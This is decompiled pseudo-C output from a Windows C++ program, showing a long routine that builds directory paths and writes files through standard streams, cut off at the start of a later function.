bool __thiscall sub_409930(_DWORD *this, _DWORD *a2, int a3)
{
  return this[1] == *(_DWORD *)(a2[1] + 4) && *a2 == a3;
}

//----- (00409960) --------------------------------------------------------
bool __thiscall sub_409960(void *this, int a2, _DWORD *a3)
{
  _DWORD *v3; // eax
  char v5[8]; // [esp+4h] [ebp-8h] BYREF

  v3 = (_DWORD *)(*(int (__thiscall **)(void *, char *, int))(*(_DWORD *)this + 12))(this, v5, a2);
  return *(_DWORD *)(v3[1] + 4) == *(_DWORD *)(a3[1] + 4) && *v3 == *a3;
}
// 409960: using guessed type char var_8[8];

//----- (004099A0) --------------------------------------------------------
void __usercall sub_4099A0(
        __m64 a1@<mm0>,
        __m64 a2@<mm1>,
        int *a3,
        int a4,
        int a5,
        int a6,
        int a7,
        unsigned int a8,
        void **a9,
        int a10,
        int a11,
        int a12,
        size_t Size,
        unsigned int a14)
{
  int *v14; // eax
  char *v15; // eax
  size_t *v16; // ecx
  int v17; // eax
  bool v18; // zf
  bool v19; // cf
  unsigned int v20; // edi
  size_t *v21; // eax
  unsigned int v22; // esi
  size_t v23; // eax
  void *v24; // eax
  CHAR *v25; // ecx
  const CHAR *v26; // eax
  char *v27; // eax
  int v28; // edx
  CHAR *v29; // ecx
  int v30; // eax
  unsigned int v31; // kr04_4
  int v32; // ecx
  LPCCH *v33; // esi
  char *v34; // esi
  _QWORD *v35; // eax
  __int128 v36; // xmm0
  CHAR *v37; // ecx
  const CHAR *v38; // eax
  char *v39; // eax
  int v40; // edx
  CHAR *v41; // ecx
  int v42; // eax
  unsigned int v43; // kr0C_4
  int v44; // ecx
  LPCCH *v45; // esi
  char *v46; // esi
  __int128 *v47; // eax
  __int128 v48; // xmm0
  CHAR *v49; // ecx
  char *v50; // esi
  void **v51; // ecx
  size_t v52; // edi
  void **v53; // esi
  char *v54; // esi
  unsigned int v55; // edi
  void **v56; // esi
  char *v57; // esi
  size_t v58; // esi
  int v59; // edx
  void **v60; // ecx
  void **v61; // edi
  _QWORD *v62; // eax
  int v63; // edi
  const CHAR *v64; // eax
  char *v65; // eax
  CHAR *v66; // ecx
  CHAR *v67; // ecx
  unsigned int v68; // edi
  void *v69; // ecx
  _BYTE *v70; // edx
  void *v71; // ecx
  void *v72; // ecx
  void *v73; // ecx
  void **v74; // eax
  int v75; // edi
  const CHAR *v76; // eax
  char *v77; // eax
  CHAR *v78; // ecx
  void *v79; // ecx
  int *v80; // edx
  int v82; // esi
  void *v83; // eax
  unsigned int v84; // ecx
  void *v85; // edx
  unsigned int v86; // edi
  unsigned int v87; // eax
  size_t v88; // eax
  unsigned int v89; // ecx
  float v90; // eax
  float v91; // edx
  unsigned int v92; // edx
  int v93; // eax
  int v94; // eax
  int v95; // eax
  int v96; // eax
  const char *v97; // eax
  _DWORD *v98; // eax
  int v99; // esi
  int v100; // eax
  void *v101; // ecx
  int *v102; // eax
  char pExceptionObject[68]; // [esp+Ch] [ebp-4E8h] BYREF
  void *v104[6]; // [esp+50h] [ebp-4A4h] BYREF
  void *v105[5]; // [esp+68h] [ebp-48Ch] BYREF
  unsigned int v106; // [esp+7Ch] [ebp-478h]
  int v107[2]; // [esp+80h] [ebp-474h] BYREF
  __int128 v108; // [esp+88h] [ebp-46Ch]
  __int64 v109; // [esp+98h] [ebp-45Ch]
  int v110; // [esp+A0h] [ebp-454h]
  int v111; // [esp+A4h] [ebp-450h]
  int v112; // [esp+A8h] [ebp-44Ch]
  int v113; // [esp+ACh] [ebp-448h]
  int v114; // [esp+B0h] [ebp-444h]
  size_t *i; // [esp+B4h] [ebp-440h]
  int v116; // [esp+B8h] [ebp-43Ch] BYREF
  _DWORD *v117; // [esp+BCh] [ebp-438h]
  LPCCH v118[4]; // [esp+C0h] [ebp-434h] BYREF
  __int64 v119; // [esp+D0h] [ebp-424h]
  void *v120[4]; // [esp+D8h] [ebp-41Ch] BYREF
  __int64 v121; // [esp+E8h] [ebp-40Ch]
  size_t *v122; // [esp+F0h] [ebp-404h]
  void *v123[4]; // [esp+F4h] [ebp-400h] BYREF
  int v124; // [esp+104h] [ebp-3F0h]
  unsigned int v125; // [esp+108h] [ebp-3ECh]
  void *Block[4]; // [esp+10Ch] [ebp-3E8h] BYREF
  size_t v127; // [esp+11Ch] [ebp-3D8h]
  unsigned int v128; // [esp+120h] [ebp-3D4h]
  unsigned int v129; // [esp+124h] [ebp-3D0h]
  unsigned int v130; // [esp+128h] [ebp-3CCh]
  void *v131; // [esp+12Ch] [ebp-3C8h]
  size_t v132; // [esp+130h] [ebp-3C4h]
  int v133[44]; // [esp+134h] [ebp-3C0h] BYREF
  WCHAR v134[8]; // [esp+1E4h] [ebp-310h] BYREF
  int v135; // [esp+1F4h] [ebp-300h]
  int v136; // [esp+1F8h] [ebp-2FCh]
  __int128 v137[2]; // [esp+1FCh] [ebp-2F8h] BYREF
  WCHAR PathName[8]; // [esp+21Ch] [ebp-2D8h] BYREF
  int v139; // [esp+22Ch] [ebp-2C8h]
  int v140; // [esp+230h] [ebp-2C4h]
  void *v141[4]; // [esp+234h] [ebp-2C0h] BYREF
  float v142; // [esp+244h] [ebp-2B0h]
  int v143; // [esp+248h] [ebp-2ACh]
  __int128 v144; // [esp+24Ch] [ebp-2A8h] BYREF
  __m256 v145; // [esp+25Ch] [ebp-298h] BYREF
  __int64 v146; // [esp+27Ch] [ebp-278h]
  __int64 v147; // [esp+284h] [ebp-270h]
  void *v148[4]; // [esp+28Ch] [ebp-268h] BYREF
  int v149; // [esp+29Ch] [ebp-258h]
  unsigned int v150; // [esp+2A0h] [ebp-254h]
  LPCCH lpMultiByteStr[4]; // [esp+2A4h] [ebp-250h] BYREF
  unsigned int v152; // [esp+2B4h] [ebp-240h]
  unsigned int v153; // [esp+2B8h] [ebp-23Ch]
  void *v154; // [esp+2C0h] [ebp-234h]
  LPCCH v155[4]; // [esp+2C4h] [ebp-230h] BYREF
  __int64 v156; // [esp+2D4h] [ebp-220h]
  WCHAR WideCharStr[130]; // [esp+2DCh] [ebp-218h] BYREF
  CHAR Src[260]; // [esp+3E0h] [ebp-114h] BYREF
  int v159; // [esp+4F0h] [ebp-4h]

  v130 = 0;
  v132 = 0;
  v159 = 1;
  memset(v137, 0, sizeof(v137));
  sub_40DA90(v137);
  v14 = (int *)&a3;
  LOBYTE(v159) = 2;
  if ( a8 >= 0x10 )
    v14 = a3;
  sub_40E060((int *)v137, (int)v14);
  v15 = sub_40E050((char *)v137);
  v16 = *(size_t **)v15;
  v17 = *((_DWORD *)v15 + 1);
  v18 = v16 == (size_t *)v17;
  for ( i = (size_t *)v17; ; v18 = v122 + 6 == i )
  {
    v122 = v16;
    if ( v18 )
      break;
    v19 = v16[5] < 0x10;
    v20 = v16[4];
    v21 = v16;
    v152 = 0;
    v153 = 0;
    v132 = (size_t)v16;
    if ( !v19 )
    {
      v21 = (size_t *)*v16;
      v132 = *v16;
    }
    if ( v20 >= 0x10 )
    {
      v22 = v20 | 0xF;
      if ( (v20 | 0xF) > 0x7FFFFFFF )
        v22 = 0x7FFFFFFF;
      if ( v22 + 1 < 0x1000 )
      {
        if ( v22 == -1 )
          v25 = 0;
        else
          v25 = (CHAR *)operator new(v22 + 1);
      }
      else
      {
        v23 = v22 + 36;
        if ( v22 + 36 <= v22 + 1 )
          v23 = -1;
        v24 = operator new(v23);
        if ( !v24 )
LABEL_198:
          _invalid_parameter_noinfo_noreturn();
        v25 = (CHAR *)(((unsigned int)v24 + 35) & 0xFFFFFFE0);
        *((_DWORD *)v25 - 1) = v24;
      }
      lpMultiByteStr[0] = v25;
      memmove_0(v25, (const void *)v132, v20 + 1);
    }
    else
    {
      v22 = 15;
      *(_OWORD *)lpMultiByteStr = *(_OWORD *)v21;
    }
    v153 = v22;
    v152 = v20;
    v149 = 0;
    v150 = 7;
    LOWORD(v148[0]) = 0;
    v156 = 0x700000000i64;
    LOWORD(v155[0]) = 0;
    LOBYTE(v159) = 5;
    v26 = (const CHAR *)lpMultiByteStr;
    if ( v22 >= 0x10 )
      v26 = lpMultiByteStr[0];
    if ( !_To_wide(v26, WideCharStr) )
      goto LABEL_201;
    v27 = (char *)sub_409240((void **)v155, WideCharStr, wcslen(WideCharStr));
    sub_406820(v148, v27);
    v28 = HIDWORD(v156);
    LOBYTE(v159) = 4;
    if ( HIDWORD(v156) >= 8 )
    {
      v29 = (CHAR *)v155[0];
      if ( (unsigned int)(2 * HIDWORD(v156) + 2) >= 0x1000 )
      {
        v29 = (CHAR *)*((_DWORD *)v155[0] - 1);
        if ( (unsigned int)(v155[0] - (LPCCH)v29 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v29);
    }
    v156 = 0x700000000i64;
    LOWORD(v155[0]) = 0;
    LOBYTE(v159) = 6;
    v30 = sub_40B710(v148, v28, (int)v104);
    v156 = 0xF00000000i64;
    LOBYTE(v155[0]) = 0;
    v19 = *(_DWORD *)(v30 + 20) < 8u;
    LOBYTE(v159) = 8;
    if ( !v19 )
      v30 = *(_DWORD *)v30;
    if ( !_To_byte((LPCWCH)v30, Src) )
LABEL_202:
      sub_40E72D("invalid wchar_t filename argument");
    v31 = strlen(Src);
    v32 = v156;
    if ( v31 > HIDWORD(v156) - (int)v156 )
    {
      LOBYTE(v110) = 0;
      v35 = sub_4063C0((void **)v155, v31, v110, Src, v31);
    }
    else
    {
      LODWORD(v156) = v31 + v156;
      v33 = v155;
      if ( HIDWORD(v156) >= 0x10 )
        v33 = (LPCCH *)v155[0];
      v34 = (char *)v33 + v32;
      memmove(v34, Src, v31);
      v34[v31] = 0;
      v35 = v155;
    }
    v130 |= 1u;
    v121 = 0i64;
    v36 = *(_OWORD *)v35;
    LOBYTE(v159) = 7;
    *(_OWORD *)v120 = v36;
    v121 = v35[2];
    *((_DWORD *)v35 + 4) = 0;
    *((_DWORD *)v35 + 5) = 15;
    *(_BYTE *)v35 = 0;
    if ( HIDWORD(v156) >= 0x10 )
    {
      v37 = (CHAR *)v155[0];
      if ( (unsigned int)(HIDWORD(v156) + 1) >= 0x1000 )
      {
        v37 = (CHAR *)*((_DWORD *)v155[0] - 1);
        if ( (unsigned int)(v155[0] - (LPCCH)v37 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v37);
    }
    v124 = 0;
    v125 = 7;
    LOWORD(v123[0]) = 0;
    v156 = 0x700000000i64;
    LOWORD(v155[0]) = 0;
    v38 = (const CHAR *)lpMultiByteStr;
    LOBYTE(v159) = 11;
    if ( v153 >= 0x10 )
      v38 = lpMultiByteStr[0];
    if ( !_To_wide(v38, WideCharStr) )
LABEL_201:
      sub_40E72D("invalid char filename argument");
    v39 = (char *)sub_409240((void **)v155, WideCharStr, wcslen(WideCharStr));
    sub_406820(v123, v39);
    v40 = HIDWORD(v156);
    LOBYTE(v159) = 10;
    if ( HIDWORD(v156) >= 8 )
    {
      v41 = (CHAR *)v155[0];
      if ( (unsigned int)(2 * HIDWORD(v156) + 2) >= 0x1000 )
      {
        v41 = (CHAR *)*((_DWORD *)v155[0] - 1);
        if ( (unsigned int)(v155[0] - (LPCCH)v41 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v41);
    }
    v156 = 0x700000000i64;
    LOWORD(v155[0]) = 0;
    LOBYTE(v159) = 12;
    v42 = sub_40B710(v123, v40, (int)v105);
    v156 = 0xF00000000i64;
    LOBYTE(v155[0]) = 0;
    v19 = *(_DWORD *)(v42 + 20) < 8u;
    LOBYTE(v159) = 14;
    if ( !v19 )
      v42 = *(_DWORD *)v42;
    if ( !_To_byte((LPCWCH)v42, Src) )
      goto LABEL_202;
    v43 = strlen(Src);
    v44 = v156;
    if ( v43 > HIDWORD(v156) - (int)v156 )
    {
      LOBYTE(v111) = 0;
      v47 = (__int128 *)sub_4063C0((void **)v155, v43, v111, Src, v43);
    }
    else
    {
      LODWORD(v156) = v43 + v156;
      v45 = v155;
      if ( HIDWORD(v156) >= 0x10 )
        v45 = (LPCCH *)v155[0];
      v46 = (char *)v45 + v44;
      memmove(v46, Src, v43);
      v46[v43] = 0;
      v47 = (__int128 *)v155;
    }
    v48 = *v47;
    LOBYTE(v159) = 13;
    v108 = v48;
    *(_QWORD *)&v48 = *((_QWORD *)v47 + 2);
    *((_DWORD *)v47 + 4) = 0;
    *((_DWORD *)v47 + 5) = 15;
    *(_BYTE *)v47 = 0;
    v109 = v48;
    if ( HIDWORD(v156) >= 0x10 )
    {
      v49 = (CHAR *)v155[0];
      if ( (unsigned int)(HIDWORD(v156) + 1) >= 0x1000 )
      {
        v49 = (CHAR *)*((_DWORD *)v155[0] - 1);
        if ( (unsigned int)(v155[0] - (LPCCH)v49 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v49);
    }
    v154 = (void *)v108;
    v50 = (char *)Locale;
    if ( (_DWORD)v109 )
      v50 = (char *)&unk_42E764;
    v131 = v50;
    LOBYTE(v159) = 16;
    v127 = 0;
    v128 = 15;
    LOBYTE(Block[0]) = 0;
    v129 = v130 | 6;
    v132 = v130 | 6;
    sub_40BC80(Block, strlen(v50) + Size);
    v51 = (void **)&a9;
    if ( a14 >= 0x10 )
      v51 = a9;
    v52 = Size;
    if ( Size > v128 - v127 )
    {
      LOBYTE(v112) = 0;
      sub_4063C0(Block, Size, v112, v51, Size);
    }
    else
    {
      v53 = Block;
      if ( v128 >= 0x10 )
        v53 = (void **)Block[0];
      v54 = (char *)v53 + v127;
      v127 += Size;
      memmove(v54, v51, Size);
      v54[v52] = 0;
      v50 = (char *)v131;
    }
    v55 = strlen(v50);
    if ( v55 > v128 - v127 )
    {
      LOBYTE(v113) = 0;
      sub_4063C0(Block, v55, v113, v50, v55);
    }
    else
    {
      v56 = Block;
      if ( v128 >= 0x10 )
        v56 = (void **)Block[0];
      v57 = (char *)v56 + v127;
      v127 += v55;
      memmove(v57, v131, v55);
      v57[v55] = 0;
    }
    v58 = v127;
    v59 = v121;
    if ( (unsigned int)v121 <= v128 - v127 || HIDWORD(v121) - (int)v121 < v127 )
    {
      v62 = sub_409090(Block, v120);
    }
    else
    {
      v60 = Block;
      if ( v128 >= 0x10 )
        v60 = (void **)Block[0];
      v131 = v60;
      if ( v127 > HIDWORD(v121) - (int)v121 )
      {
        LOBYTE(v114) = 0;
        v62 = sub_406240((const void **)v120, v127, v114, 0, v60, v127);
      }
      else
      {
        v61 = v120;
        LODWORD(v121) = v121 + v127;
        if ( HIDWORD(v121) >= 0x10 )
          v61 = (void **)v120[0];
        if ( (void **)((char *)v60 + v127) <= v61 || v60 > (void **)((char *)v61 + v59) )
        {
          v132 = v127;
        }
        else if ( v61 > v60 )
        {
          v132 = (char *)v61 - (char *)v60;
        }
        else
        {
          v132 = 0;
        }
        memmove((char *)v61 + v127, v61, v59 + 1);
        memmove_0(v61, v131, v132);
        memmove_0((char *)v61 + v132, (char *)v131 + v58 + v132, v58 - v132);
        v62 = v120;
      }
    }
    v119 = 0i64;
    *(_OWORD *)v118 = *(_OWORD *)v62;
    v119 = v62[2];
    *((_DWORD *)v62 + 4) = 0;
    *((_DWORD *)v62 + 5) = 15;
    *(_BYTE *)v62 = 0;
    v132 = v129 | 8;
    v63 = v130 | 0xE;
    v142 = 0.0;
    v143 = 7;
    LOWORD(v141[0]) = 0;
    v156 = 0x700000000i64;
    LOWORD(v155[0]) = 0;
    v64 = (const CHAR *)v118;
    LOBYTE(v159) = 19;
    if ( HIDWORD(v119) >= 0x10 )
      v64 = v118[0];
    if ( !_To_wide(v64, WideCharStr) )
      goto LABEL_201;
    v65 = (char *)sub_409240((void **)v155, WideCharStr, wcslen(WideCharStr));
    sub_406820(v141, v65);
    LOBYTE(v159) = 18;
    if ( HIDWORD(v156) >= 8 )
    {
      v66 = (CHAR *)v155[0];
      if ( (unsigned int)(2 * HIDWORD(v156) + 2) >= 0x1000 )
      {
        v66 = (CHAR *)*((_DWORD *)v155[0] - 1);
        if ( (unsigned int)(v155[0] - (LPCCH)v66 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v66);
    }
    LOBYTE(v159) = 21;
    if ( HIDWORD(v119) >= 0x10 )
    {
      v67 = (CHAR *)v118[0];
      if ( (unsigned int)(HIDWORD(v119) + 1) >= 0x1000 )
      {
        v67 = (CHAR *)*((_DWORD *)v118[0] - 1);
        if ( (unsigned int)(v118[0] - (LPCCH)v67 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v67);
    }
    v68 = v63 & 0xFFFFFFFB;
    v119 = 0xF00000000i64;
    LOBYTE(v118[0]) = 0;
    LOBYTE(v159) = 22;
    if ( v128 >= 0x10 )
    {
      v69 = Block[0];
      if ( v128 + 1 >= 0x1000 )
      {
        v69 = (void *)*((_DWORD *)Block[0] - 1);
        if ( (unsigned int)(Block[0] - v69 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v69);
    }
    v127 = 0;
    v128 = 15;
    LOBYTE(Block[0]) = 0;
    LOBYTE(v159) = 23;
    if ( HIDWORD(v109) >= 0x10 )
    {
      v70 = v154;
      if ( (unsigned int)(HIDWORD(v109) + 1) >= 0x1000 )
      {
        v70 = (_BYTE *)*((_DWORD *)v154 - 1);
        if ( (unsigned int)((_BYTE *)v154 - v70 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v70);
    }
    LOBYTE(v159) = 24;
    if ( v106 >= 8 )
    {
      v71 = v105[0];
      if ( 2 * v106 + 2 >= 0x1000 )
      {
        v71 = (void *)*((_DWORD *)v105[0] - 1);
        if ( (unsigned int)(v105[0] - v71 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v71);
    }
    v105[4] = 0;
    v106 = 7;
    LOWORD(v105[0]) = 0;
    LOBYTE(v159) = 25;
    if ( v125 >= 8 )
    {
      v72 = v123[0];
      if ( 2 * v125 + 2 >= 0x1000 )
      {
        v72 = (void *)*((_DWORD *)v123[0] - 1);
        if ( (unsigned int)(v123[0] - v72 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v72);
    }
    v124 = 0;
    v125 = 7;
    LOWORD(v123[0]) = 0;
    LOBYTE(v159) = 26;
    if ( HIDWORD(v121) >= 0x10 )
    {
      v73 = v120[0];
      if ( (unsigned int)(HIDWORD(v121) + 1) >= 0x1000 )
      {
        v73 = (void *)*((_DWORD *)v120[0] - 1);
        if ( (unsigned int)(v120[0] - v73 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v73);
    }
    v121 = 0xF00000000i64;
    LOBYTE(v120[0]) = 0;
    sub_4075D0(v104);
    sub_4075D0(v148);
    LOBYTE(v159) = 29;
    v124 = 0;
    v125 = 15;
    LOBYTE(v123[0]) = 0;
    v132 = v68 | 0x10;
    sub_40BC80(v123, Size + 1);
    sub_409090(v123, &a9);
    sub_409160(v123, &unk_42E764, 1u);
    v74 = sub_409090(v123, lpMultiByteStr);
    v156 = 0i64;
    v75 = v68 | 0x30;
    v132 = v75;
    *(_OWORD *)v155 = *(_OWORD *)v74;
    v156 = *((_QWORD *)v74 + 2);
    v74[4] = 0;
    v74[5] = (void *)15;
    *(_BYTE *)v74 = 0;
    v135 = 0;
    v136 = 7;
    v134[0] = 0;
    v149 = 0;
    v150 = 7;
    LOWORD(v148[0]) = 0;
    v76 = (const CHAR *)v155;
    LOBYTE(v159) = 32;
    if ( HIDWORD(v156) >= 0x10 )
      v76 = v155[0];
    if ( !_To_wide(v76, WideCharStr) )
      goto LABEL_201;
    v77 = (char *)sub_409240(v148, WideCharStr, wcslen(WideCharStr));
    sub_406820((void **)v134, v77);
    sub_4075D0(v148);
    LOBYTE(v159) = 34;
    if ( HIDWORD(v156) >= 0x10 )
    {
      v78 = (CHAR *)v155[0];
      if ( (unsigned int)(HIDWORD(v156) + 1) >= 0x1000 )
      {
        v78 = (CHAR *)*((_DWORD *)v155[0] - 1);
        if ( (unsigned int)(v155[0] - (LPCCH)v78 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v78);
    }
    v156 = 0xF00000000i64;
    LOBYTE(v155[0]) = 0;
    v130 = v75 & 0xFFFFFFEF;
    LOBYTE(v159) = 35;
    if ( v125 >= 0x10 )
    {
      v79 = v123[0];
      if ( v125 + 1 >= 0x1000 )
      {
        v79 = (void *)*((_DWORD *)v123[0] - 1);
        if ( (unsigned int)(v123[0] - v79 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v79);
    }
    v139 = 0;
    v140 = 7;
    PathName[0] = 0;
    *(_OWORD *)&v145.m256_f32[4] = 0i64;
    LODWORD(v145.m256_f32[4]) = v141;
    v146 = 0i64;
    v147 = 7i64;
    LOWORD(v145.m256_f32[5]) = 0;
    LOBYTE(v159) = 37;
    sub_4088D0((int **)&v145.m256_f32[4]);
    v144 = 0i64;
    LODWORD(v144) = v141;
    *(_QWORD *)v145.m256_f32 = 0i64;
    LODWORD(v145.m256_f32[2]) = 7;
    WORD2(v144) = 0;
    LOBYTE(v159) = 39;
    v145.m256_f32[3] = v142;
    sub_4088D0((int **)&v144);
    LOBYTE(v159) = 40;
    while ( *(_QWORD *)&v145.m256_f32[3] != __PAIR64__(v144, HIDWORD(v147)) )
    {
      sub_406E20(v148, &v145.m256_f32[5]);
      LOBYTE(v159) = 41;
      sub_406820((void **)PathName, (char *)v148);
      v80 = sub_40C0E0(v107, PathName);
      v18 = *v80 == 8;
      v154 = (void *)v80[1];
      if ( v18 || *v80 == -1 )
      {
        v116 = 0;
        if ( !std::_Execute_once(
                (struct std::once_flag *)&unk_5095AC,
                (int (__stdcall *)(void *, void *, void **))sub_405DB0,
                &unk_5095B0)
          || (v117 = &unk_5095B0,
              sub_409600(PathName, &v116),
              !std::_Execute_once(
                 (struct std::once_flag *)&unk_5095AC,
                 (int (__stdcall *)(void *, void *, void **))sub_405DB0,
                 &unk_5095B0)) )
        {
          terminate();
        }
        if ( v117[1] != dword_5095B4 || v116 )
        {
          sub_406DE0(v104, "create_directory(p): invalid argument");
          LOBYTE(v159) = 42;
          v102 = sub_40B040(v107, 1);
          sub_4072D0((int)pExceptionObject, v104, *v102, v102[1]);
          _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVfilesystem_error_v1_filesystem_experimental_std__);
        }
      }
      LOBYTE(v159) = 40;
      sub_4075D0(v148);
      v82 = LODWORD(v145.m256_f32[4]);
      v83 = (void *)sub_408F40((int *)LODWORD(v145.m256_f32[4]));
      v84 = HIDWORD(v147);
      v85 = v83;
      v86 = *(_DWORD *)(v82 + 16);
      v154 = v83;
      if ( HIDWORD(v147) >= (unsigned int)v83 )
      {
        if ( (void *)HIDWORD(v147) != v83 || (unsigned int)v83 >= v86 )
          goto LABEL_161;
        v129 = v82;
        v132 = v82;
        v87 = *(_DWORD *)(v82 + 20);
        if ( v87 >= 8 )
        {
          v129 = *(_DWORD *)v82;
          v85 = v154;
        }
        v131 = (void *)(2 * (_DWORD)v85);
        v82 = LODWORD(v145.m256_f32[4]);
        if ( *(_WORD *)(v129 + 2 * (_DWORD)v85) == 47
          || (v87 < 8 ? (v88 = v132) : (v88 = *(_DWORD *)LODWORD(v145.m256_f32[4])), *(_WORD *)((char *)v131 + v88) == 92) )
        {
          v89 = HIDWORD(v147) + 1;
          for ( HIDWORD(v147) = v89; v89 < v86; HIDWORD(v147) = ++v89 )
          {
            v90 = v145.m256_f32[4];
            v91 = v145.m256_f32[4];
            if ( *(_DWORD *)(LODWORD(v145.m256_f32[4]) + 20) >= 8u )
              v90 = *(float *)LODWORD(v145.m256_f32[4]);
            if ( *(_WORD *)(LODWORD(v90) + 2 * v89) != 47 )
            {
              if ( *(_DWORD *)(LODWORD(v145.m256_f32[4]) + 20) >= 8u )
                v91 = *(float *)LODWORD(v145.m256_f32[4]);
              if ( *(_WORD *)(LODWORD(v91) + 2 * v89) != 92 )
                break;
            }
          }
        }
        else
        {
LABEL_161:
          if ( HIDWORD(v147) < v86 )
          {
            v92 = *(_DWORD *)(v82 + 20);
            while ( 1 )
            {
              v93 = v82;
              if ( v92 >= 8 )
                v93 = *(_DWORD *)v82;
              if ( *(_WORD *)(v93 + 2 * v84) != 47 )
              {
                v94 = v82;
                if ( v92 >= 8 )
                  v94 = *(_DWORD *)v82;
                if ( *(_WORD *)(v94 + 2 * v84) != 92 )
                  break;
              }
              HIDWORD(v147) = ++v84;
              if ( v84 >= *(_DWORD *)(v82 + 16) )
                goto LABEL_160;
            }
            if ( v84 < *(_DWORD *)(v82 + 16) )
            {
              do
              {
                v95 = v82;
                if ( v92 >= 8 )
                  v95 = *(_DWORD *)v82;
                if ( *(_WORD *)(v95 + 2 * v84) == 47 )
                  break;
                v96 = v82;
                if ( v92 >= 8 )
                  v96 = *(_DWORD *)v82;
                if ( *(_WORD *)(v96 + 2 * v84) == 92 )
                  break;
                ++v84;
              }
              while ( v84 < *(_DWORD *)(v82 + 16) );
              HIDWORD(v147) = v84;
            }
          }
        }
LABEL_160:
        sub_4088D0((int **)&v145.m256_f32[4]);
      }
      else
      {
        HIDWORD(v147) = v83;
        sub_4088D0((int **)&v145.m256_f32[4]);
      }
    }
    sub_4075D0((_DWORD *)&v144 + 1);
    LOBYTE(v159) = 36;
    sub_4075D0(&v145.m256_f32[5]);
    v97 = (const char *)lpMultiByteStr;
    if ( v153 >= 0x10 )
      v97 = lpMultiByteStr[0];
    sub_40E090((int)v137, v97);
    memset(v133, 0, sizeof(v133));
    v133[0] = (int)&unk_42E75C;
    LOBYTE(v159) = 43;
    v130 |= 0x1C0u;
    v132 = v130;
    v133[26] = (int)&std::ostream::`vftable';
    v133[25] = 96;
    sub_40AE80((struct std::ios_base *)&v133[26], (int)&v133[1], 0);
    v159 = 45;
    *(int *)((char *)v133 + *(_DWORD *)(v133[0] + 4)) = (int)&std::ofstream::`vftable';
    *(int *)((char *)&v133[-1] + *(_DWORD *)(v133[0] + 4)) = *(_DWORD *)(v133[0] + 4) - 104;
    v133[1] = (int)&std::streambuf::`vftable';
    v98 = operator new(8u);
    v99 = (int)v98;
    if ( v98 )
    {
      *(_QWORD *)v98 = 0i64;
      LOBYTE(v159) = 46;
      v98[1] = std::locale::_Init(1);
    }
    else
    {
      v99 = 0;
    }
    v133[14] = v99;
    sub_408D70(&v133[1]);
    v133[1] = (int)&std::filebuf::`vftable';
    sub_408C70((int)&v133[1], 0, 0);
    LOBYTE(v159) = 47;
    v100 = sub_40C1C0(v134, (int)v148);
    v19 = *(_DWORD *)(v100 + 20) < 0x10u;
    LOBYTE(v159) = 48;
    if ( !v19 )
      v100 = *(_DWORD *)v100;
    sub_40B350(v133, (char *)v100, 2, 64);
    LOBYTE(v159) = 47;
    if ( v150 >= 0x10 )
    {
      v101 = v148[0];
      if ( v150 + 1 >= 0x1000 )
      {
        v101 = (void *)*((_DWORD *)v148[0] - 1);
        if ( (unsigned int)(v148[0] - v101 - 4) > 0x1F )
          goto LABEL_198;
      }
      sub_40FBF3(v101);
    }
    sub_40DC80((int)v137, a1, a2, v133);
    if ( !sub_4095B0((FILE **)&v133[1]) )
      sub_409530(
        (int *)((char *)v133 + *(_DWORD *)(v133[0] + 4)),
        *((_BYTE *)&v133[3] + *(_DWORD *)(v133[0] + 4)) | (4
                                                         * (*(int *)((char *)&v133[14] + *(_DWORD *)(v133[0] + 4)) == 0)
                                                         + 2),
        0);
    *(int *)((char *)v133 + *(_DWORD *)(v133[0] + 4)) = (int)&std::ofstream::`vftable';
    *(int *)((char *)&v133[-1] + *(_DWORD *)(v133[0] + 4)) = *(_DWORD *)(v133[0] + 4) - 104;
    sub_407490((int)&v133[1]);
    *(int *)((char *)v133 + *(_DWORD *)(v133[0] + 4)) = (int)&std::ostream::`vftable';
    *(int *)((char *)&v133[-1] + *(_DWORD *)(v133[0] + 4)) = *(_DWORD *)(v133[0] + 4) - 8;
    LOBYTE(v159) = 49;
    v133[26] = (int)&std::ios_base::`vftable';
    std::ios_base::_Ios_base_dtor((struct std::ios_base *)&v133[26]);
    sub_4075D0(PathName);
    sub_4075D0(v134);
    sub_4075D0(v141);
    LOBYTE(v159) = 2;
    if ( v153 >= 0x10 )
      sub_405C50(lpMultiByteStr[0], v153 + 1);
    v16 = v122 + 6;
  }
  sub_40DB90((int)v137);
  sub_405C00(&a3);
  sub_405C00(&a9);
}
// 409C10: variable 'v28' is possibly undefined
// 409E63: variable 'v40' is possibly undefined
// 42E5D4: using guessed type void *std::ios_base::`vftable';
// 42E6D0: using guessed type void *std::ostream::`vftable';
// 42E6D8: using guessed type void *std::streambuf::`vftable';
// 42E718: using guessed type void *std::filebuf::`vftable';
// 42E758: using guessed type void *std::ofstream::`vftable';
// 5095B4: using guessed type int dword_5095B4;

//----- (0040AE30) --------------------------------------------------------
_DWORD *__thiscall sub_40AE30(_DWORD *this, int a2)
{
  _DWORD *v3; // edi
  _DWORD *result; // eax

  v3 = sub_406A10(a2);
  result = (_DWORD *)(*(int (__thiscall **)(_DWORD *))(*v3 + 12))(v3);
  if ( (_BYTE)result )
  {
    this[14] = 0;
  }
  else
  {
    this[14] = v3;
    return sub_408D70(this);
  }
  return result;
}

//----- (0040AE80) --------------------------------------------------------
void __thiscall sub_40AE80(struct std::ios_base *this, int a2, char a3)
{
  _DWORD *v4; // eax
  _DWORD *v5; // edi
  int v6; // ecx
  char *v7; // edi
  void (__thiscall ***v8)(_DWORD, int); // eax
  int v9; // eax
  char v10; // al
  bool v11; // zf
  int v12; // ecx
  int v13; // eax
  int v14; // ecx
  int *v15; // eax
  int *v16; // [esp-4h] [ebp-54h]
  int *v17; // [esp-4h] [ebp-54h]
  char pExceptionObject[20]; // [esp+Ch] [ebp-44h] BYREF
  char v19[20]; // [esp+20h] [ebp-30h] BYREF
